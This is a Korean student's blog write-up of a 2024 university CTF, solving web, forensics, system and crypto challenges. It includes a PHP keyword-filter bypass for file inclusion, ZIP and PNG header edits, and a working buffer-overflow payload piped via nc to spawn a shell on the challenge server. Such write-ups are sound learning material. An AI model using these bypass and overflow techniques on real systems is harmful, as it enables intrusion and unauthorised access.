---
title: "SecurityFACT CTF w. Alkon 2024 Writeup"
description: 제 1회 2024 건국대학교 해킹방어대회 Writeup
date: 2024-11-16 20:44:00 +0900
categories: [Security, CTF]
tags: [CTF, writeup]
author: hyungin0505
toc: true
comments: true
# image:
#     path: /assets/img/
#     alt: image alternative text
pin: false
---

---

![Image](/assets/img/241116_0/0.png)

<details markdown="1">
<summary>잡소리</summary>

수능 전주에 공지가 올라왔는데 마침 수능이 끝난 다음날 열린다.  
개꿀ㅋㅋ  
다니던 대학에서의 마지막 이벤트가 되기를 바라는 마음으로 참여했다.  
</details>

<br>

---

Alkon 알고리즘 동아리랑 같이 출제하셨기 때문에 알고리즘 문제도 있다.  
분야는 프로그래밍 (알고리즘), 암호학, 리버싱, 블록체인, 시스템, 웹, 포렌식, 오신트로 있다.  

<br>

---

## Web
#### bypass_filter

flag는 flag.php에 존재합니다. 우회를 통해 원하는 페이지를 열어주세요.  

<br>

---

![Image](https://blog.kakaocdn.net/dna/cUxlq6/btsKK3yoRKg/AAAAAAAAAAAAAAAAAAAAAGvJz40WlM3R5TK5MII-J3ZC0Rda_p8WUZR340hAqBoM/img.png?credential=yqXZFxpELC7KVnFOS48ylbz2pIh7yKj8&expires=1751295599&allow_ip=&allow_referer=&signature=R9pd7dPd1Z90fT1gfB1PAjTKyn4%3D)

`bypass.php`{: .filepath} 파일이 주어진다.  
세 파일 리스트가 나오고 `a.gif`{: .filepath}, `bypass.php`{: .filepath}, `flag.php`{: .filepath}가 있다.  

저 이름, 마지막 수정 일자, 크기, 설명을 누르면 해당 기준대로 파일들이 정렬된다.  

<br>

---

![Image](https://blog.kakaocdn.net/dna/tjv91/btsKKIH09hz/AAAAAAAAAAAAAAAAAAAAAKHSfU60l5OxjTXqzGbSpF2URAJhDak6WSyyeiqkD2Pb/img.gif?credential=yqXZFxpELC7KVnFOS48ylbz2pIh7yKj8&expires=1751295599&allow_ip=&allow_referer=&signature=mCe3%2BDrHxjAl8JFJo%2BGZEjdB6IY%3D)

`a.gif`{: .filepath}를 누르면 이런 움짤이 나오고 `flag.php`{: .filepath}에서는 아무것도 나오지 않는다.  

<br>

---

![Image](https://blog.kakaocdn.net/dna/bvgsqY/btsKLuvCL1h/AAAAAAAAAAAAAAAAAAAAALTVUt9aTjnoxrWR6pz72NYO-0CD5N7_VryQjsFooVtL/img.png?credential=yqXZFxpELC7KVnFOS48ylbz2pIh7yKj8&expires=1751295599&allow_ip=&allow_referer=&signature=jg4ndWCg3tU6tuD52FYpQucdqVM%3D)

`bypass.php`{: .filepath}에서는 폼 하나 나온다.  
`a` 또는 `a.gif`를 제출하면 아까 그 움짤이 나올 줄 알았는데 그건 아니다.  

<br>

---

![Image](https://blog.kakaocdn.net/dna/RPe5V/btsKKx0X8G9/AAAAAAAAAAAAAAAAAAAAAOonnsW8cPXIfxSs_DXmVr8PCo0VRq4n-Q_bUwgMRtyJ/img.png?credential=yqXZFxpELC7KVnFOS48ylbz2pIh7yKj8&expires=1751295599&allow_ip=&allow_referer=&signature=ezEDlVBIxngWAXe8SDQI0m70JRM%3D)

무작정 아까 있던 `flag.php`{: .filepath} 제출했는데 띠껍게 놉~.~!  

뭐 어쩌라고  

<br>

---
```php
<?php

if (isset($_GET['test'])) {
    if (preg_match("/^.*(flag|etc|test|passwd|group|shadow|php|ini|sql|index).*$/im", $_GET['test'])) {
        $message = "nope ~.~! 안전하지 않은 파일 요청입니다.";
    } else if ($_GET['test'] === "phpinfo") {
        ob_start();
        phpinfo();
        $phpinfo = ob_get_clean();
    } else {
        include "./" . str_replace(" ", "", $_GET['test'] . ".php");
    }
}
?>
```

문제 파일로 주어진 `bypass.php`{: .filepath}를 뜯어보자.  

`preg_match`로 특정 문자열들을 검열하고 있다.  
근데 else문을 보면 공백을 없애는 코드가 있는데 이를 이용하면 검열되는 키워드를 입력할 수 있다.  

예를 들어, test라는 문자열을 입력하고 싶다면 "te st"를 보내면 된다.  
if 문에서 `preg_match`에 걸리지 않고 else로 이동하여 공백이 사라지면 "test"가 되어 잘 보내진다.  

<br>

---

![Image](https://blog.kakaocdn.net/dna/q6ugs/btsKL1fAuSA/AAAAAAAAAAAAAAAAAAAAAHdgLcCtSi7lVHHU5v_zgJXXiaNPgkchxK8aPyHw1mbV/img.png?credential=yqXZFxpELC7KVnFOS48ylbz2pIh7yKj8&expires=1751295599&allow_ip=&allow_referer=&signature=%2BOotg2LgNKHqndxPqqr4%2BOwv5EY%3D)

그래서 "fl ag"를 제출하면 이렇게 플래그를 얻을 수 있다.  

<br>

---

## Forensic
#### 건덕이는포렌식고수

건국대학교의 또 다른 마스코트, 건덕이!  
어느 날 일감호를 신나게 헤엄치던 건덕이는 수상한 입구 하나를 발견합니다.  
들리는 소문에 따르면, 그곳엔 엄청난 황금이 숨겨져 있다고 합니다.  
하지만 입구는 단단한 자물쇠로 잠겨 있었고,  문을 만든 제작자는 비밀번호를 설정해두었다는데…건덕이는 거금을 들여 비밀번호(플래그)가 숨겨진 파일을 구해냈습니다.  
건덕이가 황금을 찾아낼 수 있도록 숨겨진 플래그를 찾아주세요!  

<br>

---

![Image](https://blog.kakaocdn.net/dna/bVC44R/btsKMGu9DC3/AAAAAAAAAAAAAAAAAAAAAOpbO1dSAd2_EFF3gmHd9apjIM_Z31-tHornUqec01jp/img.png?credential=yqXZFxpELC7KVnFOS48ylbz2pIh7yKj8&expires=1751295599&allow_ip=&allow_referer=&signature=0dlfKyDKGbinGN%2BoArtiwDDHz0s%3D)

`Secret`{: .filepath} 파일이 하나 주어진다.  

010Editor로 뜯어보면 png 파일인 거 알 수 있다.  

<br>

---

![Image](https://blog.kakaocdn.net/dna/b8xqbT/btsKKFLl64r/AAAAAAAAAAAAAAAAAAAAACPBoQiXsLL_7R6gwr2rt2QftmLs_4N5isPCORHY-M63/img.png?credential=yqXZFxpELC7KVnFOS48ylbz2pIh7yKj8&expires=1751295599&allow_ip=&allow_referer=&signature=4dTUCVy%2Bv7Gx00RfM%2FYMrXoHfIg%3D)

건대에 있는 황소상인가보다.  
근데 플래그가 보이지 않으니 뭘 더 해줘야 한다.  

<br>

---

![Image](https://blog.kakaocdn.net/dna/ALw3S/btsKLbC4BfH/AAAAAAAAAAAAAAAAAAAAACptqN6nLdHymrWZHJiSEsSfVRqYcVWN29hzT2pq97-A/img.png?credential=yqXZFxpELC7KVnFOS48ylbz2pIh7yKj8&expires=1751295599&allow_ip=&allow_referer=&signature=wtELvnK8OG04a%2BuxMt9WM4Y7LCQ%3D)

근데 헥스값들 뒤에 힌트가 있다.  
저 영역은 png 파일에서 딱히 의미가 없는 부분이다.  

뒤에 등호 두 개 붙으면 base64인 경우가 대부분이더라  
`I recommend increasing the vertical size`라는 문자가 나온다.  

<br>

---

![Image](https://blog.kakaocdn.net/dna/dcJtxa/btsKMnJcVR4/AAAAAAAAAAAAAAAAAAAAAPFJ0ZY-GcFq1-BvwWgFPQy3pA7O5zp_6lM-qrii1R7f/img.png?credential=yqXZFxpELC7KVnFOS48ylbz2pIh7yKj8&expires=1751295599&allow_ip=&allow_referer=&signature=289YAd1uEoE%2BEqQSPEyw6kEKIxg%3D)

수능 3일 전에 갑자기 포렌식 문제가 급꼴려서 드림핵에서 풀어보다가 png 파일 구조를 좀 공부했었는데 `ihdr` 영역에서 `width`랑 `height`를 바꿀 수가 있다.  

`07 D0` -> 2000  

`height` 값을 바꾸고 저장을 해주자  

<br>

---

![Image](https://blog.kakaocdn.net/dna/bDEN3o/btsKKHh6Xol/AAAAAAAAAAAAAAAAAAAAACn0TxHUIXl01r9NWbdLP-3I6rsD-np0SFya-XXLPQ0-/img.png?credential=yqXZFxpELC7KVnFOS48ylbz2pIh7yKj8&expires=1751295599&allow_ip=&allow_referer=&signature=%2BlnaG4aD5mwGPOo4IEgrzJ%2BzAdo%3D)

`crc` 값으로 `widht`랑 `height`를 역연산해서 원본 너비와 높이를 구할 수도 있지만 이건 그냥 높이만 늘리면 플래그가 나와서 딱히 의미가 없다.  

<br>

---

#### 못 찾겠지? 못찾겠쥐  

건덕이는 축제 기간에 터키 아이스크림을 먹으려고 한다.  
하지만 특이하게도 이곳은 과자가 아닌 flag를 잡아야만 아이스크림을 준다고 한다;;  
FLAG를 잡아보자.  

<br>

---

![Image](https://blog.kakaocdn.net/dna/F1J5K/btsKMkTt4pH/AAAAAAAAAAAAAAAAAAAAADAosua32j7f1ZoydhvcLyBl9TEwq3Q26W9Xfdq_GGJp/img.png?credential=yqXZFxpELC7KVnFOS48ylbz2pIh7yKj8&expires=1751295599&allow_ip=&allow_referer=&signature=Ej6AaVEbSpHyz6h%2FktGF4iAMp7s%3D)

docx 파일 나오는데 당연히 안 열린다.  
010으로 뜯으면 파일 시그니처 PK 나오는데 이게 압축 파일 포맷이라고 한다.  

<br>

---

![Image](https://blog.kakaocdn.net/dna/bb9PQc/btsKMjmG88Y/AAAAAAAAAAAAAAAAAAAAAINMJKKna6GKxQaMjyNl4bPEPT_6ri-LXkDgOsw3EUvb/img.png?credential=yqXZFxpELC7KVnFOS48ylbz2pIh7yKj8&expires=1751295599&allow_ip=&allow_referer=&signature=fSJDR9BVyeasX0RJR1%2FEQqGTjqk%3D)

근데 압축 걸려 있어서 안 열린다.  
날로 먹으려고 반디집 4자리 암호 풀기도 했는데 그딴거로 안 되더라  

<br>

---

![Image](https://blog.kakaocdn.net/dna/dGDy6C/btsKK27iWkv/AAAAAAAAAAAAAAAAAAAAAEGeyX5vKj32QJYk2vTmUpqgsBK9HWj5OVpKrUere2ER/img.png?credential=yqXZFxpELC7KVnFOS48ylbz2pIh7yKj8&expires=1751295599&allow_ip=&allow_referer=&signature=w5sgqu0j7sYM72BN93%2BvoO4OqsA%3D)

압축 파일 내부에 어떤 파일이 들어있는지는 확인 가능하지만 해당 파일의 내용은 알 수 없다.  
zip 파일 구조를 이용해서 문제를 풀 수 있다.  

Flags 비트 영역의 `09 08`을 `08 08`으로 바꾸면 암호화가 해제된다.  

<br>

---
### System
#### 축제용사건국이의 먹거리탈취작전

건국대학교 축제 날, 공대생인 건국이는 한창 붐비는 축제장의 인기 부스를 찾았습니다.  
부스에서는 유명한 먹거리를 나눠주고 있었고, 운영진들은 대기하는 사람들에게 특정한 코드를 나눠주고 있었습니다.  
추첨 결과가 나왔을 때, 건국이는 자신에게 배정된 코드가 총 수용 인원인 48명을 넘어서는 49번째 순번으로 뽑힌 것을 알게 되었습니다.  
건국이가 우울에 잠긴 그 순간, 너무 많은 사람들로 인해 부스 앞은 인파로 넘쳐나기 시작했고, 어찌 된 일인지 그 상황은 통제가 어려워졌습니다.  
예상 밖의 인원 초과는 곧 축제장의 허점을 만들었고, 건국이는 그 기회를 노리려고 합니다. 건국이가 먹을 것을 얻을 수 있게 도와주세요!  

<br>

---

![Image](https://blog.kakaocdn.net/dna/bkWMFo/btsKM5ON2iL/AAAAAAAAAAAAAAAAAAAAANwJandE194fPb-OI60wg8A7y0L4SG1iaek-1ErN5GH4/img.png?credential=yqXZFxpELC7KVnFOS48ylbz2pIh7yKj8&expires=1751295599&allow_ip=&allow_referer=&signature=O%2BCOnIS%2FS0js4aqs%2FUJ12e8H%2BRI%3D)

번호표 보여달라고 한다.  

<br>

---

```c
void get_shell() {
    char* shell= "/bin/sh";
    char* args[2];

    args[0] = shell;
    args[1] = NULL;

    execve("/bin/sh", args, NULL);
}

void exec_func() {
    char buf[0x30];
    int key = 0x0badf00d;
    printf("번호표를 보여주세요: ");
    gets(buf);

    if (key == 0xf1e1d00d) {
        printf("Nice Try!");
    }

    else {
        printf("Access Denied!");
    }
}
```

예전 드림핵 시스템 강의 초반부에 있던 예시 문제랑 느낌이 비슷하다.  
`gets`에서 입력 받고 오버플로우 일으켜서 `get_shell` 주소를 덮어씌워야 한다.  

<br>

---

![Image](https://blog.kakaocdn.net/dna/8HFDB/btsKLf6ubM1/AAAAAAAAAAAAAAAAAAAAAFTRevOOVIriYNjuJQrOC4ArRZTcZAPp-UEd7I2QjnVc/img.png?credential=yqXZFxpELC7KVnFOS48ylbz2pIh7yKj8&expires=1751295599&allow_ip=&allow_referer=&signature=XDTTnoc8z%2BcvuUMZyHoYnRA4tFQ%3D)

문제 설명에도 힌트가 있는데 pwndbg로 주소값들 확인해보면 48만큼 거리차 나니까 48 길이 쓰레기값 보내고 `get_shell` 주소 덮으면 된다.  

pwn 파이썬 모듈로 하려고 했는데 자꾸 안 되서 그냥 직접 인라인으로 페이로드를 보내주었다.  

```bash
(python3 -c "import sys; sys.stdout.buffer.write(b'A'*0x48+b'\xa8\x12\x40\x00\x00\x00')";cat) | nc.rbp.rip 9006
```

<br>

---

### Crypto
#### 쿠가 가져간 열쇠  

청심대에 앉아 AES 암호 문제를 풀고 있었는데 쿠가 key를 가져가버렸어요. 쿠를 쫓아가 key를 얻어 문제를 풀어주세요.  

<br>

---

```python
secret_key = bytes([rnd.randint(0, 2**8) for _ in range(32)])


with open('flag.txt', 'rb') as file:
    data = file.read()
secret_info = data

def result(info, secret_key):
    encryptor = AAEESS.new(secret_key, AAEESS.MODE_ECB)
    encrypted = encryptor.encrypt(Padding.pad(info, AAEESS.block_size))
    with open('result.txt', 'w') as file:
        file.write(encrypted.hex())

result(secret_info, secret_key)
```

그냥 간단한 AES 문제이다.  

<br>

---

```python
import importlib
import random as rnd

AAEESS = importlib.import_module('Crypto.Cipher.AES')
Padding = importlib.import_module('Crypto.Util.Padding')

rnd.seed('''

@@@

''')
secret_key = bytes([rnd.randint(0, 2**8) for _ in range(32)])

reselt = "6b8204ab9f4924b96ff2eaa4c3c7e85fd6151b34f2c558434c4f610d7a4c066e"

from Crypto.Cipher import AES
from Crypto.Util import Padding

encrypted_hex = "6b8204ab9f4924b96ff2eaa4c3c7e85fd6151b34f2c558434c4f610d7a4c066e"

encrypted = bytes.fromhex(encrypted_hex)

decryptor = AES.new(secret_key, AES.MODE_ECB)
decrypted = Padding.unpad(decryptor.decrypt(encrypted), AES.block_size)

print("Decrypted data:", decrypted.decode())
```

<br>

---

이 외에도 알고리즘 두 문제 풀었는데 귀찮아서 쓰지 않겠다  

내일 아침 일찍부터 논술이 두 개나 있어서 일찍 자느라 3등만 맞춰놓고 잤는데 논술 끝나고 오니까 6등으로 밀려나있었다  
조금은 아쉽지만 시스템 해킹을 풀어봤다는 거에 의의를 두기로 했다.  
